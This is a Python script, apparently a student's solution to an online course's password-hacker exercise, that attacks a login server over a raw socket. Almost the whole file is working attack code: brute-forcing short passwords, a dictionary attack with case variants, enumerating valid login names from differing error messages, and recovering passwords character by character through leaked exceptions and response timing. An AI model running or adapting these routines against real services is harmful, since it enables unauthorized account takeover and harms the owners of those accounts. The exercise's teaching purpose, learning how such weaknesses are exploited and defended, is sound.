# write your code here
import sys
import socket
import itertools
import json
import string
from datetime import datetime
from urllib import request

ADMIN_LOGINS = r"https://stepik.org/media/attachments/lesson/255258/logins.txt"
USER_PASSWORDS = r"https://stepik.org/media/attachments/lesson/255258/passwords.txt"
BUFFER_SIZE = 1024
SUCCESS_MSG = "Connection success!"
OBTAINED_USERNAME = "Wrong password!"
CAUGHT_LETTER = "Exception happened during login"
chars = [chr(x) for x in range(97, 97 + 26)]
chars += [str(x) for x in range(10)]


def get_data_from_url(url):
    data = request.urlopen(url)
    return map(str.strip, map(bytes.decode, data))


def brute_force_attack_password(hostname, port):
    address = (hostname, port)
    with socket.socket() as hacker:
        hacker.connect(address)
        for i in range(1, len(chars) + 1):
            for candidate in itertools.product(chars, repeat=i):
                password = "".join(candidate)
                hacker.send(password.encode())
                responses = hacker.recv(BUFFER_SIZE).decode()
                if responses == SUCCESS_MSG:
                    return password
                elif responses == "Too many attempts":
                    return False


# generate all diversity of a word
# using words as a list get the results
def recurse(convert, word, words):
    if word == "":
        words.append(convert)
        return

    if word[0].lower() == word[0].upper():
        recurse(convert + word[0], word[1:], words)
    else:
        recurse(convert + word[0].lower(), word[1:], words)
        recurse(convert + word[0].upper(), word[1:], words)


def dictionary_attack_password(hostname, port, dictionary_file):
    with open(dictionary_file) as file:
        with socket.socket() as hacker:
            hacker.connect((hostname, port))
            for line in file:
                candidates = []
                recurse("", line.strip(), candidates)
                for password in candidates:
                    hacker.send(password.encode())
                    if hacker.recv(BUFFER_SIZE).decode() == SUCCESS_MSG:
                        return password


def crack_password(connection, login_json):
    login_json["password"] = passwd = ""
    total = 0
    elapsed_time = []
    avg_consume_time = 0
    while True:
        for ch in string.printable:
            total += 1
            login_json["password"] = passwd + ch
            start = datetime.timestamp(datetime.now()) * 1000000
            connection.send(json.dumps(login_json).encode())
            srv_res = connection.recv(BUFFER_SIZE).decode()
            finish = datetime.timestamp(datetime.now()) * 1000000
            consume_time = finish - start
            if total < 20:
                elapsed_time.append(consume_time)
                avg_consume_time = sum(elapsed_time) / len(elapsed_time)
            if json.loads(srv_res).get("result") == SUCCESS_MSG:
                print(json.dumps(login_json, indent=4))
                return
            elif json.loads(srv_res).get("result") == CAUGHT_LETTER:
                passwd = login_json["password"]
                break
            if consume_time > avg_consume_time + 1000:
                # print("crack by elapsed time. avg is", avg_consume_time, "this time is", consume_time)
                passwd = login_json["password"]
                break


def dict_attack_loginname(hostname, port, login_names):
    with open(login_names) as login:
        # for login in get_data_from_url(ADMIN_LOGINS):
        with socket.socket() as hacker:
            hacker.connect((hostname, port))
            login_object = {"password": "a"}
            # print("stage 1")
            for login_name in login:
                login_object["login"] = login_name.strip()
                login_json = json.dumps(login_object)
                hacker.send(login_json.encode())
                response_json = hacker.recv(BUFFER_SIZE).decode()
                # print("stage 2 server response:", response_json)
                if json.loads(response_json).get("result") == OBTAINED_USERNAME:
                    # print("stage 3 obtained username", login_name)
                    crack_password(hacker, login_object)
                    return


args = sys.argv
if len(args) == 4:
    addr = (args[1], int(args[2]))
    with socket.socket() as client:
        client.connect(addr)
        client.send(args[3].encode())
        response = client.recv(BUFFER_SIZE)
        print(response.decode())
elif len(args) == 3:
    # print(dictionary_attack_password(args[1], int(args[2]), "passwords.txt"))
    dict_attack_loginname(args[1], int(args[2]), "logins.txt")
else:
    print("the number of arguments is wrong!!")
